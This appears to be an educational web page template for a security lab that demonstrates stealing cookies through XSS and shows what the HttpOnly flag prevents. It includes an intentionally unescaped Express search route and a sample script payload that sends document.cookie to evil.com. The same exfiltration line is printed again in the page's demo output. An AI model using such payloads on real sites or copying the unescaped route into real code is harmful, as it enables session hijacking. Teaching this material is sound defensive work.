@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Cookie Theft Demo — Cookie Lab</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; padding: 20px; }
+    .container { max-width: 700px; margin: 0 auto; }
+    .header { display: flex; justify-content: space-between; align-items: center; background: white; padding: 16px 24px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); }
+    .header h1 { font-size: 20px; color: #333; }
+    .header a { color: #4a90d9; text-decoration: none; font-weight: 600; }
+    .card { background: white; padding: 24px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); margin-bottom: 16px; }
+    .card h2 { font-size: 17px; color: #333; margin-bottom: 12px; border-bottom: 2px solid #f0f0f0; padding-bottom: 8px; }
+    code { background: #f0f0f0; padding: 1px 5px; border-radius: 3px; font-size: 13px; }
+
+    .attack-step { padding: 16px; border-radius: 10px; border-left: 4px solid #e74c3c; background: #fef2f2; margin-bottom: 12px; }
+    .attack-step h3 { font-size: 15px; color: #c0392b; margin-bottom: 6px; }
+    .attack-step p { font-size: 13px; color: #555; line-height: 1.5; }
+
+    .code-block { background: #1e1e1e; color: #d4d4d4; padding: 14px 18px; border-radius: 8px; font-family: 'Consolas', monospace; font-size: 13px; line-height: 1.5; overflow-x: auto; margin: 8px 0; }
+    .code-block .comment { color: #6a9955; }
+    .code-block .keyword { color: #569cd6; }
+    .code-block .string { color: #ce9178; }
+    .code-block .func { color: #dcdcaa; }
+
+    .btn { padding: 10px 20px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; color: white; }
+    .btn-danger { background: #e74c3c; }
+    .btn-danger:hover { background: #c0392b; }
+    .btn-info { background: #4a90d9; }
+    .btn-info:hover { background: #357abd; }
+
+    .result-box { margin-top: 10px; padding: 14px; background: #1e1e1e; color: #d4d4d4; border-radius: 8px; font-family: monospace; font-size: 13px; min-height: 60px; white-space: pre-wrap; word-break: break-all; }
+
+    .status-badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 600; }
+    .status-badge.vulnerable { background: #fef2f2; color: #dc2626; border: 1px solid #fca5a5; }
+    .status-badge.protected { background: #f0fdf4; color: #16a34a; border: 1px solid #86efac; }
+
+    .comparison { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .comparison > div { padding: 14px; border-radius: 8px; }
+    .comparison .bad { background: #fef2f2; border: 1px solid #fca5a5; }
+    .comparison .good { background: #f0fdf4; border: 1px solid #86efac; }
+    .comparison h4 { font-size: 14px; margin-bottom: 6px; }
+    .comparison p { font-size: 12px; color: #555; line-height: 1.4; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>🕵️ XSS Cookie Theft Demo</h1>
+      <a href="/dashboard">← Back to Dashboard</a>
+    </div>
+
+    <!-- Current Status -->
+    <div class="card">
+      <h2>Current Cookie Status</h2>
+      <p style="font-size: 14px; margin-bottom: 8px;">
+        HttpOnly:
+        <span class="status-badge <%= cookieSettings.httpOnly ? 'protected' : 'vulnerable' %>">
+          <%= cookieSettings.httpOnly ? '🛡️ ON (Protected)' : '⚠️ OFF (Vulnerable)' %>
+        </span>
+      </p>
+      <p style="font-size: 13px; color: #666;">
+        <% if (cookieSettings.httpOnly) { %>
+          The session cookie has HttpOnly — JavaScript can't read it. XSS can't steal your session.
+        <% } else { %>
+          The session cookie does NOT have HttpOnly — JavaScript CAN read it. Try the attacks below!
+        <% } %>
+      </p>
+    </div>
+
+    <!-- Step-by-step attack -->
+    <div class="card">
+      <h2>🎯 Attack Simulation: Stealing Cookies via XSS</h2>
+
+      <div class="attack-step">
+        <h3>Step 1: Attacker finds an XSS vulnerability</h3>
+        <p>Imagine a search page that reflects user input without escaping:</p>
+        <div class="code-block">
+          <span class="comment">// Vulnerable server code:</span><br>
+          app.<span class="func">get</span>(<span class="string">'/search'</span>, (req, res) => {<br>
+          &nbsp;&nbsp;res.<span class="func">send</span>(<span class="string">`Results for: ${req.query.q}`</span>); <span class="comment">// NO ESCAPING!</span><br>
+          });
+        </div>
+      </div>
+
+      <div class="attack-step">
+        <h3>Step 2: Attacker injects cookie-stealing payload</h3>
+        <p>The attacker crafts a URL with XSS that reads <code>document.cookie</code>:</p>
+        <div class="code-block">
+          <span class="comment">// Malicious URL:</span><br>
+          http://victim.com/search?q=<span class="string">&lt;script&gt;</span><br>
+          &nbsp;&nbsp;<span class="func">fetch</span>(<span class="string">"http://evil.com/steal?c="</span> + <span class="keyword">document</span>.cookie)<br>
+          <span class="string">&lt;/script&gt;</span>
+        </div>
+      </div>
+
+      <div class="attack-step">
+        <h3>Step 3: Try it now!</h3>
+        <p>Click the buttons below to simulate reading cookies with JavaScript:</p>
+
+        <div style="margin-top: 12px; display: flex; gap: 10px;">
+          <button class="btn btn-danger" onclick="attackReadCookie()">
+            💀 document.cookie
+          </button>
+          <button class="btn btn-info" onclick="attackShowAll()">
+            🔍 Show all cookie details
+          </button>
+        </div>
+
+        <div class="result-box" id="attack-result">Click a button to simulate the XSS attack...</div>
+      </div>
+    </div>
+
+    <!-- Comparison -->
+    <div class="card">
+      <h2>⚔️ HttpOnly OFF vs ON</h2>
+      <div class="comparison">
+        <div class="bad">
+          <h4>❌ HttpOnly OFF</h4>
+          <div class="code-block" style="font-size: 11px; padding: 8px;">
+            <span class="comment">// Attacker's XSS payload:</span><br>
+            <span class="keyword">document</span>.cookie<br>
+            → <span class="string">"session_id=abc123; user_prefs=..."</span><br><br>
+            <span class="comment">// Session STOLEN! Attacker can now:</span><br>
+            <span class="comment">// 1. Send cookie to evil.com</span><br>
+            <span class="comment">// 2. Use it in their browser</span><br>
+            <span class="comment">// 3. Access victim's account</span>
+          </div>
+        </div>
+        <div class="good">
+          <h4>✅ HttpOnly ON</h4>
+          <div class="code-block" style="font-size: 11px; padding: 8px;">
+            <span class="comment">// Attacker's XSS payload:</span><br>
+            <span class="keyword">document</span>.cookie<br>
+            → <span class="string">"user_prefs=..."</span><br><br>
+            <span class="comment">// session_id is INVISIBLE!</span><br>
+            <span class="comment">// Attacker can't steal it.</span><br>
+            <span class="comment">// They can still do DOM damage</span><br>
+            <span class="comment">// but can't hijack the session.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Important caveat -->
+    <div class="card" style="border-left: 4px solid #e67e22;">
+      <h2>💡 Important: HttpOnly ≠ Full XSS Protection</h2>
+      <p style="font-size: 13px; color: #555; line-height: 1.6;">
+        HttpOnly only prevents <strong>cookie theft</strong>. An XSS attacker can still:
+      </p>
+      <ul style="margin: 8px 0 0 20px; font-size: 13px; color: #555; line-height: 1.8;">
+        <li>Read the page content (passwords, emails, etc.)</li>
+        <li>Modify the DOM (change bank transfer amounts)</li>
+        <li>Make authenticated requests using <code>fetch()</code> — cookies are sent automatically!</li>
+        <li>Redirect the user to a phishing page</li>
+        <li>Install a keylogger</li>
+      </ul>
+      <p style="margin-top: 8px; font-size: 13px; color: #555;">
+        <strong>Real defense against XSS = Content Security Policy (CSP) + input sanitization.</strong>
+        HttpOnly is just one layer.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    function attackReadCookie() {
+      const result = document.getElementById('attack-result');
+      const cookies = document.cookie;
+
+      if (!cookies || cookies.trim() === '') {
+        result.textContent = '🔒 document.cookie returned EMPTY!\n\nNo cookies are visible to JavaScript.\nThis means HttpOnly is working — the session cookie is hidden.';
+        result.style.borderLeft = '3px solid #27ae60';
+      } else {
+        let output = '💀 COOKIES STOLEN via document.cookie:\n\n';
+        const parts = cookies.split(';').map(c => c.trim());
+        let hasSession = false;
+
+        parts.forEach(cookie => {
+          const [name, ...rest] = cookie.split('=');
+          const value = rest.join('=');
+          const n = name.trim();
+          output += `  📎 ${n} = ${value}\n`;
+          if (n === 'session_id' || n === '__Host-session_id') {
+            hasSession = true;
+            output += `     ↑ 💀 THIS IS THE SESSION COOKIE!\n`;
+          }
+        });
+
+        if (hasSession) {
+          output += '\n🚨 ATTACK SUCCESSFUL!\n';
+          output += 'Attacker would now send this to their server:\n';
+          output += `  fetch("http://evil.com/steal?c=" + encodeURIComponent("${cookies}"));\n`;
+          output += '\nThen paste it in their browser to hijack your session.';
+          result.style.borderLeft = '3px solid #e74c3c';
+        } else {
+          output += '\n🛡️ Session cookie is not visible (HttpOnly is protecting it)\n';
+          output += 'Only non-sensitive cookies like user_prefs are readable.';
+          result.style.borderLeft = '3px solid #27ae60';
+        }
+
+        result.textContent = output;
+      }
+    }
+
+    function attackShowAll() {
+      const result = document.getElementById('attack-result');
+      let output = '🔍 Detailed Cookie Analysis:\n\n';
+
+      output += '━━━ JavaScript-Visible Cookies (document.cookie) ━━━\n';
+      const cookies = document.cookie;
+      if (cookies) {
+        cookies.split(';').forEach(c => {
+          output += `  ${c.trim()}\n`;
+        });
+      } else {
+        output += '  (none — all cookies are HttpOnly)\n';
+      }
+
+      output += '\n━━━ What the attacker CAN do even without cookie theft ━━━\n';
+      output += '  ✓ Read page HTML: document.body.innerHTML\n';
+      output += '  ✓ Make requests AS the user: fetch("/api/profile")\n';
+      output += '  ✓ Modify the DOM: change form actions, inject forms\n';
+      output += '  ✓ Keylog: document.addEventListener("keypress", ...)\n';
+
+      output += '\n━━━ What HttpOnly prevents ━━━\n';
+      output += '  ✗ Cannot read session_id from JavaScript\n';
+      output += '  ✗ Cannot exfiltrate session to attacker server\n';
+      output += '  ✗ Cannot manually set session in attacker\'s browser\n';
+
+      result.textContent = output;
+      result.style.borderLeft = '3px solid #4a90d9';
+    }
+  </script>
+</body>
+</html>
